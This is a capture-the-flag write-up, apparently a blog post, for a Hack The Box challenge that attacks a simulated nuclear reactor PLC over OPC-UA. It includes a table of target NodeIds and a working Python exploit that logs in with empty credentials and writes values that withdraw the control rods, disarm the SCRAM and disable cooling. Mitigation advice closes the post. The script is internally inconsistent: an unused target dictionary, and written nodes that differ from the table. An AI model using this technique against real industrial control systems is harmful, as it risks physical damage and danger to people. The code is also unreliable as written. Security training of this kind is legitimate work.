---
title: "Dressrosa Reactor - ICS Challenge"
date: 2026-02-26 00:00:00 +0000
categories: [HTB-Challenges]
tags: [ics, opc-ua, plc, industrial, scada]
---

## Challenge Overview

The Dressrosa Reactor challenge simulates "a breach of an Industrial Control System (ICS) environment, specifically targeting a nuclear reactor's Programmable Logic Controller (PLC) interface exposed via the OPC Unified Architecture (OPC-UA) protocol." The goal involves breaching the OPC-UA interface to seize control and trigger a simulated core meltdown.

## Technical Background

### OPC-UA Protocol Fundamentals

OPC-UA serves as a machine-to-machine communication standard for industrial automation. Control variables are exposed as Nodes in an OPC-UA server's address space, each identified by a unique NodeId combining a Namespace Index and an Identifier.

Critical reactor variables reside in "Namespace Index 2 (`ns=2`), which is commonly used for application-specific or vendor-specific data."

### Identified Vulnerability

The primary vulnerability involves "the lack of proper write access control on critical process variables." The system uses encryption (Basic256Sha256, SignAndEncrypt) but relies on "empty username and password, suggesting a potential misconfiguration or a flaw in the certificate-based access control."

## Exploitation Strategy

The attack targets three primary systems through coordinated manipulation:

### Target NodeIds and Values

| System | NodeId | Variable | Target Value | Effect |
|--------|--------|----------|--------------|--------|
| Control Rods | `ns=2;i=11` | insertedPercentage | 0.0 | Fully withdraws rods |
| Safety System | `ns=2;i=41` | scramSystem.armed | False | Disables emergency shutdown |
| Safety System | `ns=2;i=38` | emergencyCoreCooling.status | False | Disables cooling system |
| Cooling | `ns=2;i=15` | primary flowRate | 0.0 | Stops primary cooling |
| Cooling | `ns=2;i=20` | secondary flowRate | 0.0 | Stops secondary cooling |
| Cooling | `ns=2;i=24` | pumps running | False | Disables cooling pumps |

## Exploit Code

```python
#!/usr/bin/env python3
import sys
from opcua import Client, ua

CERT = "client_cert.der"
KEY = "client_key.pem"

TARGETS = {
    "ns=2;i=11": ua.Variant(0.0, ua.VariantType.Float),
    "ns=2;i=15": ua.Variant(0.0, ua.VariantType.Float),
    "ns=2;i=20": ua.Variant(0.0, ua.VariantType.Float),
    "ns=2;i=24": ua.Variant(False, ua.VariantType.Boolean),
    "ns=2;i=38": ua.Variant(False, ua.VariantType.Boolean),
    "ns=2;i=41": ua.Variant(False, ua.VariantType.Boolean),
}

def connect(ip, port):
    url = f"opc.tcp://{ip}:{port}"
    client = Client(url)
    client.set_security_string(f"Basic256Sha256,SignAndEncrypt,{CERT},{KEY}")
    client.set_user("")
    client.set_password("")
    client.connect()
    return client

def write(client, nodeid, value, vtype):
    try:
        node = client.get_node(nodeid)
        node.set_value(ua.Variant(value, vtype))
        print(f"[+] Wrote {nodeid} = {value}")
    except Exception as e:
        print(f"[-] Failed {nodeid}: {e}")

def main():
    if len(sys.argv) != 3:
        sys.exit(f"Usage: {sys.argv[0]} <IP> <PORT>")

    ip, port = sys.argv[1], int(sys.argv[2])
    client = connect(ip, port)
    print("[+] Connected")

    write(client, "ns=2;i=11", 0.0, ua.VariantType.Float)
    write(client, "ns=2;i=41", False, ua.VariantType.Boolean)
    write(client, "ns=2;i=38", False, ua.VariantType.Boolean)
    write(client, "ns=2;i=4", 9999.0, ua.VariantType.Float)
    write(client, "ns=2;i=42", 0, ua.VariantType.Int64)

    try:
        status = client.get_node("ns=2;i=51").get_value()
        print(f"[!] Reactor status: {status}")
    except Exception:
        pass

    client.disconnect()
    print("[+] Done")

if __name__ == "__main__":
    main()
```

## Mitigation Strategies

1. **Access Control Implementation**: Restrict write permissions on critical safety nodes (SCRAM, ECCS, control rod position) to authorized applications only.
2. **Authentication Enhancement**: Implement strong user authentication (e.g., strong passwords, multi-factor authentication) and map users to specific roles with granular ACLs.
3. **Network Isolation**: Segregate OPC-UA servers from general networks, placing them in restricted OT segments with monitored gateway access.
4. **Input Validation**: Implement PLC logic checks rejecting physically impossible states.
